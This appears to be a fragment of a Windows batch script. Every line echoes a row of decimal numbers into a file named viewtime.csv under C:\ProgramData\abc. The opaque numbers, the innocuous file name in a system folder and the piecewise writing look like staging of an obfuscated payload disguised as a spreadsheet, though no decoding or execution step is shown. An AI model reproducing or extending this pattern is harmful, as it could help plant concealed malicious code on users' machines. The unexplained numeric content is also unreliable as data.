>> "C:\ProgramData\abc\viewtime.csv" echo(648.72;839.68;536.64;3708.472;139.776;36.316;72.5639;343.200;572.139;893.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(5343.837;68.436;24.772;131.5568;824.36;324.112;814.17;3212.472;129.824;36.424;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.9673;32.0;50.115;46.139;7354.568;36.324;235.59;235.4669;883.233;804.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.255;5518.751;192.572;131.896;56.7852;895.204;904.204;904.204;3607.904;204.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.572;137.1130;776.36;38.72;831.236;1756.572;232.862;244.955;255.2449;572.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(468.36;548.72;6582.839;68.336;48.672;131.9937;892.16;472.137;468.36;7612.540;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;68.636;40.8476;772.139;40.72;837.68;2787.736;32.935;13.672;139.4024;
>> "C:\ProgramData\abc\viewtime.csv" echo(568.36;432.72;839.0;8708.372;137.768;36.732;72.8636;839.68;336.40;472.57;
>> "C:\ProgramData\abc\viewtime.csv" echo(6576.368;36.532;116.325;72.7992;839.68;636.32;472.139;8860.676;36.680;72.557;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.2363;548.117;77.72;839.68;3320.636;32.935;4.935;206.0681;451.192;572.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(896.72;5190.895;204.904;204.904;204.2412;904.204;776.137;468.36;2486.424;137.684;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.716;72.3888;837.76;536.8;772.131;9712.936;88.672;139.668;36.5885;596.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;336.64;5170.472;139.568;36.364;15.7669;883.0;661.77;590.0;4161.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(116.77;51.892;233.0223;906.2;50.0;472.139;8585.368;36.664;72.799;64.8948;
>> "C:\ProgramData\abc\viewtime.csv" echo(560.72;839.76;536.96;0660.672;3.900;72.839;193.7234;672.137;568.36;624.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(8694.839;68.336;24.829;56.7800;680.69;30.0;816.7;7980.751;192.933;161.62;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8409;30.72;839.68;536.24;9962.315;183.464;4.561;100.6574;834.0;70.116;
>> "C:\ProgramData\abc\viewtime.csv" echo(47.51;9403.892;233.838;2.50;0.7792;884.8;60.0;40.72;0405.807;192.53;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.2036;736.24;772.141;832.1;9102.836;0.40;0.372;137.1206;768.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(748.72;839.68;0083.536;48.831;56.30;116.6959;311.72;839.68;736.48;7758.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(120.74;0.817;7.1505;451.192;933.83;62.0;8200.60;72.839;68.436;24.2636;
>> "C:\ProgramData\abc\viewtime.csv" echo(715.183;364.20;672.139;7630.576;36.424;72.841;68.6211;51.24;472.137;368.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(8271.416;72.839;68.436;24.1598;515.183;364.6;802.137;7983.568;36.58;72.899;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.6527;536.32;70.0;40.0;3270.351;192.802;137.44;36.2707;935.11;315.183;
>> "C:\ProgramData\abc\viewtime.csv" echo(74.36;5383.802;255.892;102.837;4.5946;336.15;883.4;336.15;5346.883;76.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.459;193.9596;615.141;58.1;40.0;0705.315;183.54;36.372;107.0726;892.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;476.36;3746.516;72.73;200.772;139.1001;893.185;41.0;60.0;4640.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(107.901;0.315;182.7926;34.8;831.248;446.15;9983.833;218.70;0.30;15.1438;
>> "C:\ProgramData\abc\viewtime.csv" echo(883.4;736.72;807.192;8586.640;72.839;76.336;16.9883;672.3;900.72;839.193;
>> "C:\ProgramData\abc\viewtime.csv" echo(9165.885;1.50;0.60;72.5648;807.201;51.15;882.4;4482.68;131.948;116.715;
>> "C:\ProgramData\abc\viewtime.csv" echo(133.4861;877.0;60.0;615.183;6145.54;36.372;107.892;40.1330;772.139;476.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(616.72;0952.63;200.672;139.893;185.7170;51.0;70.0;572.107;2149.901;2.615;
>> "C:\ProgramData\abc\viewtime.csv" echo(182.64;8.1263;831.248;801.15;833.136;6161.60;0.30;15.883;4.7264;536.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.192;740.72;6053.839;76.436;16.372;3.9574;900.72;839.193;885.1;2538.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;72.807;201.2766;33.15;882.4;38.131;2939.948;120.817;99.515;183.7282;
>> "C:\ProgramData\abc\viewtime.csv" echo(54.36;572.107;892.40;7352.772;139.776;36.316;72.8728;43.200;572.139;893.185;
>> "C:\ProgramData\abc\viewtime.csv" echo(5075.71;0.40;0.772;107.5129;901.4;515.182;54.8;6105.831;248.816;117.562;
>> "C:\ProgramData\abc\viewtime.csv" echo(15.6774;883.4;636.72;807.192;4451.440;72.839;76.436;16.1687;572.3;900.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.193;9075.885;1.70;0.30;72.8759;807.201;35.15;882.4;8427.48;133.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(117.526;15.0217;883.4;536.72;807.192;2505.640;72.839;76.736;16.7055;672.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(900.72;839.193;4310.572;137.668;36.732;235.1300;45.233;920.254;955.255;7612.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.824;36.332;0.1686;817.7;651.192;933.233;9157.60;0.40;72.839;68.3365;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.48;839.0;372.139;7659.576;36.396;72.33;200.0116;472.139;893.72;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(8053.536;40.672;139.768;36.9860;348.139;364.4;651.210;0007.885;12.70;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.6428;947.241;837.68;536.56;4313.899;68.436;4.40;0.4218;30.0;935.10;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;8418.336;4.955;192.837;68.3026;636.4;839.68;336.56;0753.657;68.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.515;131.0620;852.0;60.0;839.68;1633.636;4.572;107.892;12.1951;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.4;772.107;2682.901;12.672;139.484;36.5809;540.76;839.68;736.40;0308.765;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.512;8.839;68.2795;42.4;343.193;837.68;6426.736;60.839;68.436;104.7117;
>> "C:\ProgramData\abc\viewtime.csv" echo(357.68;336.60;815.2;6302.935;180.839;68.536;4.1798;672.107;892.12;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(0652.476;36.340;72.839;84.8689;636.32;839.82;312.57;3259.420;1.814;34.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.1876;536.4;772.107;892.12;7996.572;139.676;36.332;139.7843;573.12;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(484.36;0577.532;3.374;8.772;139.9150;784.36;540.57;612.2;1079.814;5.933;
>> "C:\ProgramData\abc\viewtime.csv" echo(115.955;255.1892;955.139;768.36;74.72;6451.807;192.612;72.839;76.0824;436.112;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;784.36;8405.340;139.44;2.837;1.0431;884.1;60.0;70.235;9747.37;
>> "C:\ProgramData\abc\viewtime.csv" echo(233.380;255.955;255.3466;751.192;572.131;896.88;2516.895;204.904;204.904;204.8880;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;904.204;0422.476;137.776;36.332;76.0372;837.68;636.24;672.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(0251.584;36.316;72.837;76.5760;536.8;472.131;936.104;7909.372;139.832;36.836;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.1977;40.0;772.137;368.36;9597.656;72.831;124.336;56.2998;50.117;341.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(71.0;3350.70;0.572;105.892;87.3875;44.0;30.72;839.76;4849.636;112.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.465;8.1476;672.139;908.72;839.76;1439.536;112.932;241.347;0.6652;30.51;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.233;60.1;5902.30;0.372;139.768;36.8244;820.72;75.200;50.0;3141.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.837;68.336;48.7903;472.139;368.36;748.72;7801.899;0.70;0.60;0.2764;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.139;768.36;348.72;4429.899;64.58;0.70;0.8686;50.72;839.68;436.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(5677.372;199.664;16.30;0.1504;30.0;672.199;768.36;7369.664;0.50;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(198.7943;568.36;432.0;372.139;8674.768;36.356;72.839;0.5956;672.137;668.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(540.72;8728.831;124.536;40.40;116.5978;796.72;839.68;436.40;2003.572;137.568;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.364;72.1933;839.68;436.40;672.45;9533.900;0.60;0.372;137.5607;368.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.72;839.68;4605.636;72.772;139.764;48.9818;572.137;668.36;680.72;3057.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.636;80.772;57.5660;832.36;828.0;60.0;6124.815;20.772;139.468;36.6159;
>> "C:\ProgramData\abc\viewtime.csv" echo(440.72;839.0;672.137;2381.568;36.340;198.668;36.5467;432.0;935.19;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(1820.668;36.640;72.839;64.6309;38.72;837.68;536.40;1374.898;68.436;32.41;
>> "C:\ProgramData\abc\viewtime.csv" echo(235.2273;852.76;839.76;736.48;7530.368;15.882;68.636;32.5412;472.139;784.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(764.72;7170.839;76.436;56.772;139.2495;368.36;812.255;844.216;4407.50;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.61;0.4360;60.0;672.105;892.155;4516.54;0.70;72.839;76.2159;636.112;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.3;365.8;9591.772;139.908;72.839;76.7197;636.112;932.239;646.0;7254.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.61;0.70;0.2136;472.131;896.104;895.204;3949.904;204.904;204.768;137.6114;
>> "C:\ProgramData\abc\viewtime.csv" echo(576.36;532.76;837.68;1565.336;24.772;137.784;36.2672;616.72;837.76;736.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(4777.772;131.936;120.472;139.4413;832.36;860.0;30.0;9789.772;137.668;36.664;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.8062;831.124;336.64;60.117;5634.547;184.41;0.50;0.6632;372.105;892.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(63.0;9123.30;72.839;140.436;128.2662;70.0;40.72;73.65;2087.38;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(208.372;139.4863;840.36;828.0;30.0;7642.932;139.446;0.60;51.0907;892.233;
>> "C:\ProgramData\abc\viewtime.csv" echo(826.1;30.0;3228.831;188.436;152.50;0.7808;40.0;817.47;884.1;0942.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;72.805;192.7709;885.3;40.0;472.139;2859.840;36.828;0.50;0.1530;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.3;365.8;772.139;3710.908;72.839;140.536;128.6516;40.0;30.232;382.46;
>> "C:\ProgramData\abc\viewtime.csv" echo(4682.60;0.651;192.933;69.5669;31.0;40.51;892.102;0477.837;68.436;48.315;
>> "C:\ProgramData\abc\viewtime.csv" echo(183.1284;368.36;548.72;839.140;2635.536;144.40;0.40;15.4758;883.4;365.133;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.116;0611.315;15.883;68.636;48.6875;802.255;892.102;837.68;5758.436;48.935;
>> "C:\ProgramData\abc\viewtime.csv" echo(220.372;139.9945;832.36;844.0;40.0;6464.672;137.768;36.496;15.8056;883.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.48;372.209;8040.924;102.837;68.636;88.6570;415.183;768.36;588.72;6520.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.72;102.837;68.9682;736.90;899.68;636.52;8090.30;0.30;0.676;141.6164;
>> "C:\ProgramData\abc\viewtime.csv" echo(576.36;552.69;351.192;5284.878;1.772;141.376;36.5094;488.72;839.132;536.128;
>> "C:\ProgramData\abc\viewtime.csv" echo(9351.30;0.40;255.844;208.9892;30.0;40.137;668.36;4764.756;131.824;36.556;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8450;816.52;884.1;70.0;4577.30;72.805;192.931;3.2877;50.0;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;3294.828;0.70;0.472;3.9757;365.8;568.139;768.36;7131.756;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(208.672;139.1511;840.36;828.0;50.0;7719.932;155.545;0.50;51.1532;892.233;
>> "C:\ProgramData\abc\viewtime.csv" echo(842.0;50.0;7498.839;68.336;52.831;224.4420;631.137;468.36;460.72;1934.599;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.436;60.572;107.8234;892.16;372.139;476.36;3367.364;72.63;200.572;139.8674;
>> "C:\ProgramData\abc\viewtime.csv" echo(893.72;837.68;536.80;2307.839;132.536;152.50;0.3172;40.72;839.140;336.136;
>> "C:\ProgramData\abc\viewtime.csv" echo(7191.70;0.50;72.73;200.3576;372.139;893.72;837.68;8242.536;72.372;139.684;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.0954;472.72;839.76;436.80;4858.932;183.73;0.30;184.8039;61.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.105;1401.892;30.54;0.40;72.3162;839.140;536.128;60.0;6123.30;72.63;
>> "C:\ProgramData\abc\viewtime.csv" echo(65.38;72.3264;839.76;636.72;772.137;5204.476;36.732;68.839;76.4077;436.52;
>> "C:\ProgramData\abc\viewtime.csv" echo(568.139;468.36;5811.660;72.839;208.372;139.7208;840.36;828.0;60.0;0330.932;
>> "C:\ProgramData\abc\viewtime.csv" echo(11.445;0.40;184.6159;41.0;40.0;372.131;7432.896;120.895;204.476;137.7472;
>> "C:\ProgramData\abc\viewtime.csv" echo(776.36;332.68;837.68;6302.336;24.672;137.484;36.7079;716.72;837.76;536.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(0015.586;87.472;129.936;184.6109;60.0;50.72;839.132;8302.436;232.60;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.2147;837.68;536.48;472.131;7340.824;36.648;0.817;47.8050;884.1;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.72;5897.805;192.41;5.40;0.5155;372.139;840.36;908.0;8288.60;0.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.665;8.0230;572.139;908.72;839.140;6087.336;208.70;0.50;232.0920;866.44;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;351.192;0817.933;3.53;0.50;72.3646;839.132;436.216;40.0;1466.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.837;68.736;104.8715;472.139;468.36;804.72;4762.699;64.460;72.839;140.5965;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.216;30.0;60.72;1109.33;200.372;139.893;72.0817;837.68;336.112;884.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(4761.30;0.60;72.807;192.7440;73.72;839.76;536.112;9541.672;139.832;1.836;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.7925;40.0;772.137;368.36;1792.580;131.824;36.680;0.2485;816.7;831.124;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.84;5247.70;117.447;184.51;0.0093;30.0;772.105;892.73;9023.65;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;140.1106;336.208;50.0;50.72;0892.33;65.68;72.839;208.7441;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;908.0;7552.70;0.932;37.744;0.1998;30.51;892.233;830.2;4470.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.839;68.736;80.9922;472.139;840.36;916.0;6390.70;0.672;3.900;72.5042;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.193;772.137;568.36;4787.496;139.468;36.384;137.1563;668.36;772.72;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(4881.736;48.772;139.676;36.0762;448.139;773.4;357.8;3623.814;64.884;1.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.3765;70.72;805.192;829.5;1716.30;0.672;139.840;36.5458;908.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.3;4256.765;8.472;139.576;36.6303;748.68;839.73;74.72;7719.839;76.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(48.568;139.2498;71.72;839.208;572.139;2798.840;36.908;0.50;0.6599;932.181;
>> "C:\ProgramData\abc\viewtime.csv" echo(643.0;40.51;5204.892;233.618;2.50;0.6281;472.139;468.36;448.139;6782.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.568;36.556;199.5860;768.36;560.0;30.0;0399.50;235.710;139.568;36.0912;
>> "C:\ProgramData\abc\viewtime.csv" echo(360.255;892.137;668.36;1502.760;72.839;68.636;48.7183;839.0;757.68;336.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(7480.815;40.839;68.636;60.1131;472.107;892.24;372.139;5232.776;36.648;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.2726;61.24;372.57;832.36;0222.916;0.50;0.815;10.2532;839.68;736.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;6554.736;56.935;2.935;193.0155;372.139;568.36;748.139;0119.364;4.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(107.892;24.6096;572.131;892.16;837.68;2742.336;68.472;141.832;36.8805;828.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;372.139;5318.948;51.892;185.348;0.0531;60.0;943.170;765.184;0089.648;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;0.472;141.4533;848.36;828.0;60.0;2506.472;139.676;36.548;72.1802;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;636.208;40.0;8986.60;255.844;200.40;0.0096;40.139;832.36;864.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(6109.40;0.837;68.636;88.9440;899.68;636.32;64.0;9017.60;0.668;139.576;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.5603;668.76;839.68;736.48;2793.651;210.472;139.840;36.2052;908.0;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(932.181;4521.71;0.60;72.839;68.0699;436.48;839.0;757.68;5809.536;56.815;
>> "C:\ProgramData\abc\viewtime.csv" echo(92.372;139.2482;568.36;348.139;40.137;0168.568;36.664;235.610;139.8896;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(764.255;900.137;3825.568;36.764;139.468;36.8236;756.57;368.36;364.118;3529.359;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.668;36.564;255.3550;900.139;892.72;807.192;3323.624;139.476;36.664;72.3425;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;424.72;839.84;5148.736;48.472;139.824;36.5407;748.72;837.124;536.120;
>> "C:\ProgramData\abc\viewtime.csv" echo(1423.672;141.824;10.516;72.1610;839.76;436.120;672.141;1833.816;1.416;185.624;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8967;70.0;943.164;935.177;0885.839;68.436;56.372;107.1910;892.24;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(476.36;3050.548;72.839;84.536;96.1147;372.137;584.1;616.139;3901.468;36.556;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.807;192.2192;424.72;839.76;436.48;7139.672;139.848;36.916;0.4113;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.137;584.1;9455.724;139.668;36.456;72.5298;807.192;424.72;839.76;3181.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(48.839;148.736;224.3858;70.0;50.137;684.1;5918.732;139.768;36.756;72.4748;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.192;724.72;839.76;0873.336;48.839;84.536;72.2959;837.84;51.36;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(0947.568;36.648;139.30;255.3962;892.72;839.76;636.48;7576.837;1.772;139.368;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.8568;548.139;364.8;955.192;0795.372;139.576;36.748;137.2856;765.8;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.88;2146.837;68.436;32.468;139.8480;476.36;668.76;839.68;6233.636;48.351;
>> "C:\ProgramData\abc\viewtime.csv" echo(210.772;139.6121;840.36;908.0;50.0;0006.932;171.40;0.60;184.9511;41.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;472.105;2198.892;192.75;0.60;72.2003;839.140;336.208;50.0;6230.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.33;65.58;139.8570;576.36;772.137;376.36;6731.732;76.839;76.536;96.1692;
>> "C:\ProgramData\abc\viewtime.csv" echo(468.139;368.36;356.72;9454.839;208.472;139.840;36.2202;908.0;70.0;932.161;
>> "C:\ProgramData\abc\viewtime.csv" echo(5330.441;0.40;184.71;0.3251;30.0;572.129;896.184;4512.40;0.60;95.494;
>> "C:\ProgramData\abc\viewtime.csv" echo(195.6412;904.204;672.137;684.36;6924.716;72.837;76.336;8.3481;372.131;936.24;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;0852.768;36.432;72.839;64.9679;38.72;837.4;436.72;1318.839;68.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.372;139.3524;576.36;432.72;837.8;3968.572;139.368;36.540;72.6774;839.12;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.72;837.72;0740.58;72.839;4.336;72.3130;839.76;436.40;472.137;6181.58;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;68.636;32.4739;672.139;476.36;540.72;5442.837;72.78;72.831;196.5573;
>> "C:\ProgramData\abc\viewtime.csv" echo(724.195;904.204;904.204;8369.904;204.904;204.904;204.4611;904.204;468.137;376.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(4877.432;76.837;68.336;24.4000;772.137;784.36;516.72;6184.837;76.736;8.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.7280;936.56;899.68;636.32;2121.60;0.70;0.899;68.2453;336.36;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;1095.839;68.536;88.457;68.1282;536.32;815.53;839.68;8477.336;32.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.376;36.7078;480.72;63.200;472.139;8164.893;68.839;76.436;96.8131;376.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.72;839.84;9437.336;72.672;139.476;36.6410;364.232;788.16;40.0;3035.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.336;32.75;0.2700;316.0;70.137;768.36;3950.332;235.893;72.831;196.8755;
>> "C:\ProgramData\abc\viewtime.csv" echo(756.195;904.204;904.204;6768.472;137.676;36.58;87.6257;472.129;936.112;57.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(4562.30;184.71;0.70;0.2531;572.105;892.254;71.0;5949.40;72.839;140.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(128.6738;77.0;60.72;63.65;3578.78;72.839;208.572;139.5101;840.36;828.7;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;9435.932;139.540;0.40;72.5597;839.140;536.128;57.0;2737.30;232.842;
>> "C:\ProgramData\abc\viewtime.csv" echo(17.70;0.9321;372.139;840.36;828.7;7536.30;0.932;1.319;0.9016;40.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;736.112;3429.572;139.684;36.812;72.2584;839.140;736.128;67.0;3172.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(232.806;10.30;0.0493;672.139;832.36;828.7;5404.70;0.372;139.364;16.9291;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.0;837.68;536.64;8255.884;1.50;0.60;72.8515;807.192;64.72;839.140;
>> "C:\ProgramData\abc\viewtime.csv" echo(2999.436;128.77;0.30;72.1431;53.65;416.72;837.132;5953.736;152.40;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.6947;51.0;60.0;372.105;7512.892;23.32;0.40;72.2578;839.140;736.128;
>> "C:\ProgramData\abc\viewtime.csv" echo(77.0;7461.50;72.53;65.38;72.2672;837.132;336.144;30.0;9186.50;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.736;144.9038;30.0;60.72;837.68;2308.736;80.899;68.336;88.1082;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;899.68;4825.536;92.60;0.70;0.9876;572.141;832.36;860.0;9783.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;139.948;51.1337;892.185;908.6;70.0;2653.943;170.372;139.468;36.2226;
>> "C:\ProgramData\abc\viewtime.csv" echo(480.15;890.0;833.192;2686.515;132.61;4.60;0.3308;831.124;436.92;60.15;
>> "C:\ProgramData\abc\viewtime.csv" echo(1841.833;246.63;0.40;72.1625;839.68;436.80;372.137;6801.368;36.472;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.5979;536.72;715.190;70.133;6811.892;116.628;72.839;68.7026;636.72;415.190;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.131;7172.948;124.816;15.772;139.3617;468.36;772.72;955.192;1522.672;137.568;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.472;235.8989;916.72;839.68;436.72;1857.315;190.70;131.948;124.5850;817.21;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;668.36;5309.372;198.60;0.772;139.4873;368.36;772.72;955.192;1967.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.568;36.772;65.9177;884.208;76.0;30.51;5741.910;72.841;140.536;160.7731;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;40.232;866.35;7425.30;0.476;141.832;36.5669;860.0;60.0;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(8651.784;36.580;72.839;140.2343;536.128;37.0;60.232;6382.872;239.955;255.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(199.6654;668.36;748.0;60.0;8687.50;199.568;36.340;128.2008;30.0;40.199;
>> "C:\ProgramData\abc\viewtime.csv" echo(768.36;3924.532;3.40;0.50;69.4950;651.201;365.184;51.0;1865.70;0.886;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;0.4250;828.72;839.76;336.80;4827.672;139.832;36.828;7.0796;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.80;472.72;6201.837;132.336;128.40;0.9613;40.72;831.188;636.128;0305.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;255.817;15.7709;772.139;368.36;572.72;0836.837;68.536;80.933;9.9423;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.255;955.72;899.68;5347.436;40.50;0.30;0.6416;899.68;736.32;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7652.50;0.569;51.901;65.1622;884.2;50.0;61.51;8232.910;72.839;140.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(128.8962;40.0;60.72;839.132;7864.336;128.57;0.40;255.4391;844.128;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.72;6608.837;132.336;136.60;0.5215;30.72;831.188;736.136;6818.30;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.817;34.7647;472.139;840.36;828.0;5138.40;0.472;139.832;36.9005;828.7;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;955.80;9730.580;72.839;68.336;72.0966;672.137;768.36;580.233;5152.862;
>> "C:\ProgramData\abc\viewtime.csv" echo(254.955;255.672;139.0546;832.36;648.7;70.0;1563.472;137.368;36.820;76.6288;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.140;436.136;60.0;8805.40;76.839;68.436;120.6798;372.139;784.36;812.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(5075.839;140.636;128.67;0.6719;60.232;860.10;60.0;1967.884;1.70;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.4982;805.192;788.2;70.0;0744.672;139.840;36.828;7.3185;30.0;772.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(365.8;3566.576;139.668;36.680;72.9242;839.208;372.139;840.36;3899.828;7.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.932;35.8324;538.0;70.76;841.68;1110.736;88.839;84.636;64.1460;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(676.36;820.232;2705.892;242.955;255.833;192.0416;315.132;907.1;30.0;7111.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.60;0.60;72.2190;805.192;817.2;30.0;7409.772;139.840;36.828;7.8554;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;372.3;365.8;2975.468;139.676;36.488;76.3914;839.68;636.80;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(5053.908;72.839;140.536;128.0183;77.0;70.232;914.37;3474.30;0.899;68.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(92.9496;31.0;40.0;839.68;3640.536;88.572;139.676;36.3014;820.72;43.200;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;8965.893;72.837;68.636;96.0041;884.1;30.0;70.72;7460.805;192.856;
